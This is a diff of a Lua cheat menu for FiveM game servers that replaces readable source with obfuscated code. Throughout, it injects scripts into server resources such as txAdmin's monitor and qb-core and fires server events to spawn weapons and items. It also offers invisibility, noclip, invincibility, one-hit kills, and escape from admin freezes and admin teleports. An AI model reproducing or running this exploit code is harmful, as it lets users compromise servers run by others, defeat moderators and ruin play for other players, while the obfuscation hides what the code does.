@@ -1,94 +1,21 @@
-local GuncelVersion = "1.0.4" -- Current version number
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
--- system message 
-print("S1DEV BYPASS ACTIVE")
+]]--
 
-local MenuSize = vec2(700, 500)
-local MenuStartCoords = vec2(0, 0)
-local TabSectionWidth = 150 
-
-local MenuWindow = MachoMenuTabbedWindow("S1DEV", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabSectionWidth)
-local menu = 1
--- RGB accent (changing color)
-local rgbHue = 0
-local function UpdateRGBAccent()
-    local r = math.floor(255 * math.sin(rgbHue) * 0.5 + 127.5)
-    local g = math.floor(255 * math.sin(rgbHue + 2.094) * 0.5 + 127.5)
-    local b = math.floor(255 * math.sin(rgbHue + 4.188) * 0.5 + 127.5)
-    
-    MachoMenuSetAccent(MenuWindow, r, g, b)
-    rgbHue = rgbHue + 0.02
-    if rgbHue > 6.28 then
-        rgbHue = 0
-    end
-end
-
--- RGB thread start
-Citizen.CreateThread(function()
-    while true do
-        UpdateRGBAccent()
-        Citizen.Wait(25) -- 20ms = 50 FPS color change (faster)
-    end
-end)
-MachoMenuSetKeybind(MenuWindow, 0x24)
-
-local FirstTab = MachoMenuAddTab(MenuWindow, "Main Menu")
-
--- Left section (Main controls)
-local FirstSection = MachoMenuGroup(
-    FirstTab,
-    "General",
-    420,              -- X position (fixed)
-    9,               -- Y position
-    710,             -- Width (increased)
-    MenuSize.y - 10
-)
-
--- Right section (Tx Features)
-local SecondSection = MachoMenuGroup(
-    FirstTab,
-    "Tx Features",
-    155,             -- X position (FirstSection + width + space)
-    9,               -- Y position
-    420,             -- Width (same structure)
-    MenuSize.y - 10
-)
-
--- Show/Hide ID on right side
-local idgoster = false
-MachoMenuCheckbox(FirstSection, "Show/Hide ID - Safe", function()
-    idgoster = true
-    MachoMenuNotification("Menu", "Show/Hide ID status: On")
-end, function()
-    idgoster = false
-    MachoMenuNotification("Menu", "Show/Hide ID status: Off")
-end)
-
--- TX Admin Show Player IDs (Toggle)
-local txIdsEnabled = false
-
-MachoMenuCheckbox(SecondSection, "TX Show Player IDs", function()
-    txIdsEnabled = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+local v0="1.0.4";print("S1DEV BYPASS ACTIVE");local v1=vec2(700,1725 -(942 + 283) );local v2=vec2(0 + 0 ,0 + 0 );local v3=1246 -(709 + 387) ;local v4=MachoMenuTabbedWindow("S1DEV",v2.x,v2.y,v1.x,v1.y,v3);local v5=1;local v6=1858 -(673 + 1185) ;local function v7() local v192=math.floor(((739 -484) * math.sin(v6) * 0.5) + (407.5 -280) );local v193=math.floor(((419 -164) * math.sin(v6 + 2.094 + 0 ) * (0.5 + 0)) + 127.5 );local v194=math.floor((255 * math.sin(v6 + (5.188 -1) ) * 0.5) + 32.5 + 95 );MachoMenuSetAccent(v4,v192,v193,v194);v6=v6 + 0.02 ;if (v6>(11.280000000000001 -5)) then v6=0 -0 ;end end Citizen.CreateThread(function() while true do local v491=1880 -(446 + 1434) ;while true do if (v491==(1283 -(1040 + 243))) then v7();Citizen.Wait(25);break;end end end end);MachoMenuSetKeybind(v4,107 -71 );local v8=MachoMenuAddTab(v4,"Main Menu");local v9=MachoMenuGroup(v8,"General",2267 -(559 + 1288) ,9,2641 -(609 + 1322) ,v1.y-10 );local v10=MachoMenuGroup(v8,"Tx Features",609 -(13 + 441) ,33 -24 ,1100 -680 ,v1.y-(49 -39) );local v11=false;MachoMenuCheckbox(v9,"Show/Hide ID - Safe",function() local v195=0 + 0 ;while true do if (v195==0) then v11=true;MachoMenuNotification("Menu","Show/Hide ID status: On");break;end end end,function() local v196=0 -0 ;while true do if (v196==(0 + 0)) then v11=false;MachoMenuNotification("Menu","Show/Hide ID status: Off");break;end end end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         menuIsAccessible = true
         toggleShowPlayerIDs(true, true)
-    ]])
-    MachoMenuNotification("TX Admin", "Showing player IDs")
-end, function()
-    txIdsEnabled = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("TX Admin","Showing player IDs");end,function() v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         menuIsAccessible = true
         toggleShowPlayerIDs(false, true)
-    ]])
-    MachoMenuNotification("TX Admin", "Hiding player IDs")
-end)
-
--- Toggle Invisibility
-local invisibilityActive = false
-
-MachoMenuCheckbox(SecondSection, "Invisibility", function()
-    invisibilityActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("TX Admin","Hiding player IDs");end);local v13=false;MachoMenuCheckbox(v10,"Invisibility",function() local v197=0 + 0 ;while true do if (v197==(0 -0)) then v13=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.NEVERBOKLOSEInvisibility then
             _G.NEVERBOKLOSEInvisibility = { enabled = false, wasVisible = true }
         end
@@ -106,11 +33,7 @@ MachoMenuCheckbox(SecondSection, "Invisibility", function()
                 Wait(500)
             end
         end)
-    ]])
-    MachoMenuNotification("Invisibility", "Invisibility ON")
-end, function()
-    invisibilityActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v197=1 + 0 ;end if (v197==1) then MachoMenuNotification("Invisibility","Invisibility ON");break;end end end,function() local v198=0 -0 ;while true do if (v198==(0 + 0)) then v13=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         if _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled then
             _G.NEVERBOKLOSEInvisibility.enabled = false
             local ped = PlayerPedId()
@@ -118,25 +41,7 @@ end, function()
                 SetEntityVisible(ped, _G.NEVERBOKLOSEInvisibility.wasVisible, false)
             end
         end
-    ]])
-    MachoMenuNotification("Invisibility", "Invisibility OFF")
-end)
-
-local isInvisible = false
-local isInvisible2 = false
-
--- Global variables for TX features
-local txNoclipActive = false
-local txGodmodeActive = false
-local txSuperJumpActive = false
-local txCarBoostActive = false
-
--- Invisibility On/Off Toggle Button
-MachoMenuCheckbox(FirstSection, "Invisibility - Safe", function()
-    local playerPed = PlayerPedId()
-    local playerVeh = GetVehiclePedIsIn(playerPed, false)
-
-    MachoInjectResource('qb-core', [[
+    ]]);v198=1 + 0 ;end if (v198==(1 + 0)) then MachoMenuNotification("Invisibility","Invisibility OFF");break;end end end);local v14=false;local v15=false;local v16=false;local v17=false;local v18=false;local v19=false;MachoMenuCheckbox(v9,"Invisibility - Safe",function() local v199=0 + 0 ;local v200;local v201;while true do if (1==v199) then MachoInjectResource("qb-core",[[
         local playerPed = PlayerPedId()
         local playerVeh = GetVehiclePedIsIn(playerPed, false)
 
@@ -159,13 +64,7 @@ MachoMenuCheckbox(FirstSection, "Invisibility - Safe", function()
             SetEntityLocallyVisible(playerVeh)
             SetEntityAlpha(playerVeh, 255, false)
         end
-    ]])
-    isInvisible = true
-end, function()
-    local playerPed = PlayerPedId()
-    local playerVeh = GetVehiclePedIsIn(playerPed, false)
-
-    MachoInjectResource('qb-core', [[
+    ]]);v14=true;break;end if (v199==(0 + 0)) then v200=PlayerPedId();v201=GetVehiclePedIsIn(v200,false);v199=434 -(153 + 280) ;end end end,function() local v202=PlayerPedId();local v203=GetVehiclePedIsIn(v202,false);MachoInjectResource("qb-core",[[
         local playerPed = PlayerPedId()
         local playerVeh = GetVehiclePedIsIn(playerPed, false)
 
@@ -179,55 +78,7 @@ end, function()
             NetworkSetEntityInvisibleToNetwork(playerVeh, false)
             ResetEntityAlpha(playerVeh)
         end
-    ]])
-    isInvisible = false
-end)
-
--- Continuous visibility/invisibility protection (bypass supported)
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(0)
-        if isInvisible then
-            local playerPed = PlayerPedId()
-            local playerVeh = GetVehiclePedIsIn(playerPed, false)
-
-            SetEntityVisible(playerPed, false, false)
-            NetworkSetEntityInvisibleToNetwork(playerPed, true)
-            SetEntityAlpha(playerPed, 0, false)
-
-            if playerVeh ~= 0 then
-                SetEntityVisible(playerVeh, false, false)
-                NetworkSetEntityInvisibleToNetwork(playerVeh, true)
-                SetEntityAlpha(playerVeh, 0, false)
-            end
-
-            SetEntityLocallyVisible(playerPed)
-            SetEntityAlpha(playerPed, 255, false)
-
-            if playerVeh ~= 0 then
-                SetEntityLocallyVisible(playerVeh)
-                SetEntityAlpha(playerVeh, 255, false)
-            end
-        end
-    end
-end)
-
-local noclipActive = false
-local playerPed = PlayerPedId()
-local noclipSpeed = 2.0
-local fallAnimDict = "move_jump"
-local fallAnim = "land_roll"
-
-function LoadAnimDict(dict)
-    RequestAnimDict(dict)
-    while not HasAnimDictLoaded(dict) do
-        Citizen.Wait(0)
-    end
-end
-
--- Safe Noclip Toggle Button
-MachoMenuCheckbox(FirstSection, "Noclip - Safe", function()
-    MachoInjectResource('monitor', [[
+    ]]);v14=false;end);Citizen.CreateThread(function() while true do local v492=0 -0 ;while true do if (v492==(0 + 0)) then Citizen.Wait(0 + 0 );if v14 then local v863=PlayerPedId();local v864=GetVehiclePedIsIn(v863,false);SetEntityVisible(v863,false,false);NetworkSetEntityInvisibleToNetwork(v863,true);SetEntityAlpha(v863,0 + 0 ,false);if (v864~=(0 + 0)) then SetEntityVisible(v864,false,false);NetworkSetEntityInvisibleToNetwork(v864,true);SetEntityAlpha(v864,0 + 0 ,false);end SetEntityLocallyVisible(v863);SetEntityAlpha(v863,388 -133 ,false);if (v864~=(0 + 0)) then SetEntityLocallyVisible(v864);SetEntityAlpha(v864,255,false);end end break;end end end end);local v20=false;local v21=PlayerPedId();local v22=2;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v204) local v205=667 -(89 + 578) ;while true do if (v205==(0 + 0)) then RequestAnimDict(v204);while  not HasAnimDictLoaded(v204) do Citizen.Wait(0);end break;end end end MachoMenuCheckbox(v9,"Noclip - Safe",function() local v206=0 -0 ;while true do if (v206==(1049 -(572 + 477))) then MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local fallAnimDict = "move_jump"
         local fallAnim = "land_roll"
@@ -240,687 +91,25 @@ MachoMenuCheckbox(FirstSection, "Noclip - Safe", function()
         SetEntityCollision(playerPed, false, false)
         SetEntityAlpha(playerPed, 150, false)
         SetEntityInvincible(playerPed, true)
-    ]])
-    noclipActive = true
-end, function()
-    MachoInjectResource('monitor', [[
+    ]]);v20=true;break;end end end,function() local v207=0 + 0 ;while true do if (v207==0) then MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         ClearPedTasks(playerPed)
         SetEntityCollision(playerPed, true, true)
         ResetEntityAlpha(playerPed)
         SetEntityInvincible(playerPed, false)
-    ]])
-    noclipActive = false
-end)
-
--- TX Admin Show Player IDs (Toggle)
-local txIdsEnabled = false
-
-MachoMenuCheckbox(SecondSection, "TX Show Player IDs", function()
-    txIdsEnabled = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v20=false;break;end end end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() local v208=0 + 0 ;while true do if (v208==(1 + 0)) then MachoMenuNotification("TX Admin","Showing player IDs");break;end if (v208==(86 -(84 + 2))) then v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         menuIsAccessible = true
         toggleShowPlayerIDs(true, true)
-    ]])
-    MachoMenuNotification("TX Admin", "Showing player IDs")
-end, function()
-    txIdsEnabled = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v208=1 -0 ;end end end,function() v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         menuIsAccessible = true
         toggleShowPlayerIDs(false, true)
-    ]])
-    MachoMenuNotification("TX Admin", "Hiding player IDs")
-end)
-
-
--- ============================================================
--- FB Clothes Shop
-MachoMenuButton(FirstSection, "FB Clothes Shop", function()
-    TriggerEvent('FBClothing:client:openClothingShopMenu')
-    MachoMenuNotification("FB Clothes", "Opening clothes shop...")
-end)
-
--- FB Change Character
-MachoMenuButton(FirstSection, "FB Change Character", function()
-    TriggerEvent('qb-MultiCharacter:server:openui')
-    MachoMenuNotification("FB Character", "Opening character selection...")
-end)
-
-
--- FB Revive (RespectEMS)
-MachoMenuButton(FirstSection, "FB Revive (RespectEMS)", function()
-    TriggerEvent('RespectEMS:client:revive', true)
-    MachoMenuNotification("FB Revive", "Revive requested...")
-end)
-
--- FB Hospital Revive
-MachoMenuButton(FirstSection, "FB Hospital Revive", function()
-    TriggerEvent('hospital:client:Revive')
-    MachoMenuNotification("FB Revive", "Revive requested...")
-end)
-
--- FB Ambulance Revive
-MachoMenuButton(FirstSection, "FB Ambulance Revive", function()
-    TriggerEvent('ambulancejob:client:revive')
-    MachoMenuNotification("FB Revive", "Revive requested...")
-end)
-
--- FB Cuff Self
-MachoMenuButton(FirstSection, "FB Cuff Self", function()
-    TriggerEvent('police:client:GetCuffed', -1)
-    MachoMenuNotification("FB Police", "Cuffed yourself")
-end)
-
--- FB Toggle Admin Names
-MachoMenuButton(FirstSection, "FB Toggle Admin Names", function()
-    TriggerEvent('qb-admin:client:toggleNames')
-    MachoMenuNotification("FB Admin", "Toggled admin names")
-end)
-
--- FB Toggle Admin Blips
-MachoMenuButton(FirstSection, "FB Toggle Admin Blips", function()
-    TriggerEvent('qb-admin:client:toggleBlips')
-    MachoMenuNotification("FB Admin", "Toggled admin blips")
-end)
-
--- FB Open Jail Menu
-MachoMenuButton(FirstSection, "FB Open Jail Menu", function()
-    TriggerEvent('RespectJail:client:openMenu')
-    MachoMenuNotification("FB Jail", "Opening jail menu...")
-end)
-
--- FB Open Police Reports
-MachoMenuButton(FirstSection, "FB Open Police Reports", function()
-    TriggerEvent('FB-PoliceJob:client:openReportsMenu', 'station')
-    MachoMenuNotification("FB Police", "Opening police reports...")
-end)
-
--- RT Lumberjack Item Spawner (Self)
-local SelfLumberjackItemInput = MachoMenuInputbox(FirstSection, "Item Name", "e.g., weapon_pistol")
-local SelfLumberjackAmountInput = MachoMenuInputbox(FirstSection, "Amount", "1")
-
-MachoMenuButton(FirstSection, "Spawn Item inv", function()
-    local itemName = MachoMenuGetInputbox(SelfLumberjackItemInput)
-    local amount = tonumber(MachoMenuGetInputbox(SelfLumberjackAmountInput)) or 1
-    
-    if itemName and itemName ~= '' then
-        if amount > 0 then
-            TriggerServerEvent('rt-lumberjack:server:giveItem', itemName, amount)
-            MachoMenuNotification("Item Spawn", "Spawning " .. itemName .. " x" .. amount)
-            print("[Item Spawn] Spawning " .. itemName .. " x" .. amount)
-        else
-            MachoMenuNotification("Error", "Please enter a valid amount!")
-        end
-    else
-        MachoMenuNotification("Error", "Please enter an item name!")
-    end
-end)
-
--- RT Steal Item Spawner (Self)
-local RtStealItemInput = MachoMenuInputbox(FirstSection, "22Item Name", "e.g., LOCKPICK")
-local RtStealAmountInput = MachoMenuInputbox(FirstSection, "22Amount", "1")
-
-MachoMenuButton(FirstSection, "Spawn Item IN inv", function()
-    local itemName = MachoMenuGetInputbox(RtStealItemInput)
-    local amount = tonumber(MachoMenuGetInputbox(RtStealAmountInput)) or 1
-    
-    if itemName and itemName ~= '' then
-        if amount > 0 then
-            -- Try direct trigger first
-            local success = false
-            pcall(function()
-                TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
-                success = true
-            end)
-            
-            -- If direct fails, inject into a resource
-            if not success then
-                local targetResource = nil
-                if GetResourceState('rt-steal') == "started" then
-                    targetResource = 'rt-steal'
-                elseif GetResourceState('monitor') == "started" then
-                    targetResource = 'monitor'
-                elseif GetResourceState('qb-core') == "started" then
-                    targetResource = 'qb-core'
-                else
-                    targetResource = 'ox_inventory'
-                end
-                
-                MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]]);MachoMenuNotification("TX Admin","Hiding player IDs");end);MachoMenuButton(v9,"FB Clothes Shop",function() local v209=0 + 0 ;while true do if (v209==(842 -(497 + 345))) then TriggerEvent("FBClothing:client:openClothingShopMenu");MachoMenuNotification("FB Clothes","Opening clothes shop...");break;end end end);MachoMenuButton(v9,"FB Change Character",function() local v210=0;while true do if (v210==(0 + 0)) then TriggerEvent("qb-MultiCharacter:server:openui");MachoMenuNotification("FB Character","Opening character selection...");break;end end end);MachoMenuButton(v9,"FB Revive (RespectEMS)",function() TriggerEvent("RespectEMS:client:revive",true);MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Hospital Revive",function() TriggerEvent("hospital:client:Revive");MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Ambulance Revive",function() TriggerEvent("ambulancejob:client:revive");MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Cuff Self",function() TriggerEvent("police:client:GetCuffed", -(1 + 0));MachoMenuNotification("FB Police","Cuffed yourself");end);MachoMenuButton(v9,"FB Toggle Admin Names",function() local v211=0;while true do if (v211==(1333 -(605 + 728))) then TriggerEvent("qb-admin:client:toggleNames");MachoMenuNotification("FB Admin","Toggled admin names");break;end end end);MachoMenuButton(v9,"FB Toggle Admin Blips",function() TriggerEvent("qb-admin:client:toggleBlips");MachoMenuNotification("FB Admin","Toggled admin blips");end);MachoMenuButton(v9,"FB Open Jail Menu",function() TriggerEvent("RespectJail:client:openMenu");MachoMenuNotification("FB Jail","Opening jail menu...");end);MachoMenuButton(v9,"FB Open Police Reports",function() TriggerEvent("FB-PoliceJob:client:openReportsMenu","station");MachoMenuNotification("FB Police","Opening police reports...");end);local v25=MachoMenuInputbox(v9,"Item Name","e.g., weapon_pistol");local v26=MachoMenuInputbox(v9,"Amount","1");MachoMenuButton(v9,"Spawn Item inv",function() local v212=MachoMenuGetInputbox(v25);local v213=tonumber(MachoMenuGetInputbox(v26)) or (1 + 0) ;if (v212 and (v212~="")) then if (v213>0) then local v771=0 -0 ;while true do if (v771==(0 + 0)) then TriggerServerEvent("rt-lumberjack:server:giveItem",v212,v213);MachoMenuNotification("Item Spawn","Spawning "   .. v212   .. " x"   .. v213 );v771=1;end if (v771==(3 -2)) then print("[Item Spawn] Spawning "   .. v212   .. " x"   .. v213 );break;end end else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end end);local v27=MachoMenuInputbox(v9,"22Item Name","e.g., LOCKPICK");local v28=MachoMenuInputbox(v9,"22Amount","1");MachoMenuButton(v9,"Spawn Item IN inv",function() local v214=0 + 0 ;local v215;local v216;while true do if (v214==(0 -0)) then v215=MachoMenuGetInputbox(v27);v216=tonumber(MachoMenuGetInputbox(v28)) or (1 + 0) ;v214=490 -(457 + 32) ;end if (1==v214) then if (v215 and (v215~="")) then if (v216>0) then local v923=false;pcall(function() TriggerServerEvent("rt-steal:server:giveItem",v215,v216);v923=true;end);if  not v923 then local v947=0 + 0 ;local v948;while true do if (v947==(1402 -(832 + 570))) then v948=nil;if (GetResourceState("rt-steal")=="started") then v948="rt-steal";elseif (GetResourceState("monitor")=="started") then v948="monitor";elseif (GetResourceState("qb-core")=="started") then v948="qb-core";else v948="ox_inventory";end v947=1 + 0 ;end if (v947==(1 + 0)) then MachoInjectResource2(NewThreadNs,v948,string.format([[
                     local itemName = "%s"
                     local amount = %d
                     TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
                     print("RT Steal Item: Spawned " .. itemName .. " x" .. amount)
                     TriggerEvent('chat:addMessage', { args = { '^2RT Steal:', 'Spawned ' .. itemName .. ' x' .. amount } })
-                ]], itemName, amount))
-            end
-            
-            MachoMenuNotification("RT Steal", "Spawning " .. itemName .. " x" .. amount)
-            print("[RT Steal] Spawning " .. itemName .. " x" .. amount)
-        else
-            MachoMenuNotification("Error", "Please enter a valid amount!")
-        end
-    else
-        MachoMenuNotification("Error", "Please enter an item name!")
-    end
-end)
-
-MachoMenuButton(FirstSection, "FB Clothes", function()
-    TriggerEvent('FBClothing:client:openOutfitMenu')
-    MachoMenuNotification("FB Clothes", "Opening FB outfit menu...")
-end)
-
-MachoMenuButton(FirstSection, "FB Revive", function()
-    TriggerEvent('FB_Ems:triggers:client:revivePlayer')
-    MachoMenuNotification("FB Revive", "Revive requested...")
-end)
-
--- Hospital Revive
-MachoMenuButton(FirstSection, "rc2 Revive", function()
-    TriggerEvent("hospital:client:Revive")
-    MachoMenuNotification("Hospital", "Revive requested...")
-end)
--- ============================================================
--- SELF FEATURES (Added to FirstSection - Main Menu)
--- ============================================================
-
--- s1 Teleport to Waypoint
-MachoMenuButton(FirstSection, "s1 Teleport to Waypoint", function()
-    local waypoint = GetFirstBlipInfoId(8)
-    if not DoesBlipExist(waypoint) then
-        MachoMenuNotification("s1", "No waypoint set!")
-    else
-        local coords = GetBlipInfoIdCoord(waypoint)
-        local ped = PlayerPedId()
-        local entity = ped
-        if IsPedInAnyVehicle(ped, false) then 
-            entity = GetVehiclePedIsIn(ped, false) 
-        end
-        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, false, false, false, false)
-        MachoMenuNotification("s1", "Teleported to waypoint!")
-    end
-end)
-
--- Super Jump (Toggle)
-local superJumpActive = false
-MachoMenuCheckbox(FirstSection, "s1 Super Jump", function()
-    superJumpActive = true
-    MachoMenuNotification("s1", "Super Jump ON")
-end, function()
-    superJumpActive = false
-    MachoMenuNotification("s1", "Super Jump OFF")
-end)
-
--- Fast Run Speed Slider
-local fastRunSpeed = 3
-local FastRunSliderHandle = MachoMenuSlider(FirstSection, "s1 Fast Run Speed", fastRunSpeed, 1, 10, "x", 1, function(Value)
-    fastRunSpeed = Value
-end)
-
--- Fast Run (Toggle)
-local fastRunActive = false
-MachoMenuCheckbox(FirstSection, "s1 Fast Run", function()
-    fastRunActive = true
-    MachoMenuNotification("s1", "Fast Run ACTIVE (Speed: " .. fastRunSpeed .. "x)")
-    
-    Citizen.CreateThread(function()
-        while fastRunActive do
-            Citizen.Wait(0)
-            SetPedMoveRateOverride(PlayerPedId(), fastRunSpeed + 0.0)
-        end
-        SetPedMoveRateOverride(PlayerPedId(), 1.0)
-    end)
-end, function()
-    fastRunActive = false
-    SetPedMoveRateOverride(PlayerPedId(), 1.0)
-    MachoMenuNotification("s1", "Fast Run OFF")
-end)
-
--- No Ragdoll (Toggle)
-local noRagdollActive = false
-MachoMenuCheckbox(FirstSection, "s1 No Ragdoll", function()
-    noRagdollActive = true
-    SetPedCanRagdoll(PlayerPedId(), false)
-    MachoMenuNotification("s1", "No Ragdoll ON")
-end, function()
-    noRagdollActive = false
-    SetPedCanRagdoll(PlayerPedId(), true)
-    MachoMenuNotification("s1", "No Ragdoll OFF")
-end)
-
--- Anti AFK (Toggle)
-local antiAFKActive = false
-MachoMenuCheckbox(FirstSection, "s1 Anti AFK", function()
-    antiAFKActive = true
-    MachoMenuNotification("s1", "Anti AFK ACTIVE")
-    
-    Citizen.CreateThread(function()
-        while antiAFKActive do
-            Citizen.Wait(5000)
-            local ped = PlayerPedId()
-            local coords = GetEntityCoords(ped)
-            SetEntityCoordsNoOffset(ped, coords.x + 0.01, coords.y + 0.01, coords.z, false, false, false, false)
-        end
-    end)
-end, function()
-    antiAFKActive = false
-    MachoMenuNotification("s1", "Anti AFK OFF")
-end)
-
--- Infinite Stamina (Toggle)
-local infiniteStaminaActive = false
-MachoMenuCheckbox(FirstSection, "s1 Infinite Stamina", function()
-    infiniteStaminaActive = true
-    MachoMenuNotification("s1", "Infinite Stamina ACTIVE")
-    
-    Citizen.CreateThread(function()
-        while infiniteStaminaActive do
-            Citizen.Wait(500)
-            ResetPlayerStamina(PlayerPedId())
-        end
-    end)
-end, function()
-    infiniteStaminaActive = false
-    MachoMenuNotification("s1", "Infinite Stamina OFF")
-end)
-
--- Infinite Oxygen (Toggle)
-local infiniteOxygenActive = false
-MachoMenuCheckbox(FirstSection, "s1 Infinite Oxygen", function()
-    infiniteOxygenActive = true
-    SetPedDiesInWater(PlayerPedId(), false)
-    MachoMenuNotification("s1", "Infinite Oxygen ON")
-end, function()
-    infiniteOxygenActive = false
-    SetPedDiesInWater(PlayerPedId(), true)
-    MachoMenuNotification("s1", "Infinite Oxygen OFF")
-end)
-
--- Disable Collision (Toggle)
-local disableCollisionActive = false
-MachoMenuCheckbox(FirstSection, "s1 Disable Collision", function()
-    disableCollisionActive = true
-    SetEntityCollision(PlayerPedId(), false, false)
-    MachoMenuNotification("s1", "Disable Collision ON")
-end, function()
-    disableCollisionActive = false
-    SetEntityCollision(PlayerPedId(), true, true)
-    MachoMenuNotification("s1", "Disable Collision OFF")
-end)
-
--- Fast Punch (Toggle)
-local fastPunchActive = false
-MachoMenuCheckbox(FirstSection, "s1 Fast Punch", function()
-    fastPunchActive = true
-    MachoMenuNotification("s1", "Fast Punch ON")
-end, function()
-    fastPunchActive = false
-    MachoMenuNotification("s1", "Fast Punch OFF")
-end)
-
--- Super Punch (Toggle)
-local superPunchActive = false
-MachoMenuCheckbox(FirstSection, "s1 Super Punch", function()
-    superPunchActive = true
-    SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1000000.0)
-    MachoMenuNotification("s1", "Super Punch ON (One-hit kill)")
-end, function()
-    superPunchActive = false
-    SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
-    MachoMenuNotification("s1", "Super Punch OFF")
-end)
-
--- ============================================================
--- SELF FEATURES (Added to FirstSection - Main Menu)
--- ============================================================
-
---- ============================================================
--- SELF FEATURES (Added to FirstSection - Main Menu)
--- ============================================================
-
--- Open Clothes Menu
-MachoMenuButton(FirstSection, "Open face Menu", function()
-    TriggerEvent('m3-clothingmenu:client:OpenSurgeonShop')
-    MachoMenuNotification("Clothes", "Opening clothes menu...")
-end)
-
--- Open Barber Shop
-MachoMenuButton(FirstSection, "Open Barber Shop", function()
-    TriggerEvent('m3-clothingmenu:client:OpenBarberShop')
-    MachoMenuNotification("Barber", "Opening barber shop...")
-end)
-
--- Open Clothing Shop
-MachoMenuButton(FirstSection, "Open Clothing Shop", function()
-    TriggerEvent('m3-clothingmenu:client:openClothingShopMenu')
-    MachoMenuNotification("Clothing Shop", "Opening clothing shop...")
-end)
-
--- RT Revive 2 (RespectEMS)
-MachoMenuButton(FirstSection, "RT Revive 2", function()
-    TriggerEvent('RespectEMS:triggers:client:revivePlayer')
-    MachoMenuNotification("RT Revive 2", "Revive requested...")
-end)
-
--- Change Character (qb-MultiCharacter)
-MachoMenuButton(FirstSection, "Change Character", function()
-    TriggerEvent('qb-MultiCharacter:server:openui')
-    MachoMenuNotification("Character", "Opening character selection...")
-end)
-
--- ============================================================
--- PROTECTION FEATURES (Added to FirstSection - Main Menu)
--- ============================================================
-
--- s1 Remove PTFX
-MachoMenuButton(FirstSection, "s1 Remove PTFX", function()
-    Citizen.CreateThread(function()
-        local position = GetEntityCoords(PlayerPedId())
-        RemoveParticleFxInRange(position.x, position.y, position.z, 200)
-        RemoveParticleFxFromEntity(PlayerPedId())
-        MachoMenuNotification("s1", "Removed PTFX effects")
-    end)
-end)
-
--- s1 Stop All Sounds
-MachoMenuButton(FirstSection, "s1 Stop All Sounds", function()
-    Citizen.CreateThread(function()
-        for i = 1, 100 do
-            StopSound(i)
-        end
-        MachoMenuNotification("s1", "Stopped all sounds")
-    end)
-end)
-
--- s1 Remove Admin Freeze
-MachoMenuButton(FirstSection, "s1 Remove Admin Freeze", function()
-    for i = 1, 2 do
-        EnableAllControlActions(i)
-    end
-    FreezeEntityPosition(PlayerPedId(), false)
-    SetEntityCollision(PlayerPedId(), false, true)
-    Citizen.Wait(300)
-    SetEntityCollision(PlayerPedId(), true, true)
-    
-    Citizen.Wait(2500)
-    if IsEntityPositionFrozen(PlayerPedId()) then
-        MachoMenuNotification("s1", "Detected still frozen, trying again...")
-        for i = 1, 2 do
-            EnableAllControlActions(i)
-        end
-        for i = 1, 10 do
-            FreezeEntityPosition(PlayerPedId(), false)
-        end
-        MachoMenuNotification("s1", "Admin freeze removed")
-    else
-        MachoMenuNotification("s1", "Admin freeze removed")
-    end
-end)
-
--- s1 Remove Attached Objects
-MachoMenuButton(FirstSection, "s1 Remove Attached Objects", function()
-    Citizen.CreateThread(function()
-        local objects = GetGamePool('CObject')
-        local count = 0
-        for i, object in ipairs(objects) do
-            if DoesEntityExist(object) then
-                DetachEntity(object, true, true)
-                count = count + 1
-            end
-        end
-        MachoMenuNotification("s1", "Removed " .. count .. " attached objects")
-    end)
-end)
-
--- s1 Disable Hostile Peds (Toggle)
-local disableHostilePeds = false
-MachoMenuCheckbox(FirstSection, "s1 Disable Hostile Peds", function()
-    disableHostilePeds = true
-    MachoMenuNotification("s1", "Hostile peds disabled")
-    
-    Citizen.CreateThread(function()
-        while disableHostilePeds do
-            Citizen.Wait(0)
-            SetPedResetFlag(PlayerPedId(), 124, true)
-            SetEveryoneIgnorePlayer(PlayerPedId(), true)
-        end
-    end)
-end, function()
-    disableHostilePeds = false
-    MachoMenuNotification("s1", "Hostile peds enabled")
-end)
-
--- s1 Evade Admin TP (Toggle)
-local evadeTPActive = false
-local lastPosition = nil
-MachoMenuCheckbox(FirstSection, "s1 Evade Admin TP", function()
-    evadeTPActive = true
-    lastPosition = GetEntityCoords(PlayerPedId())
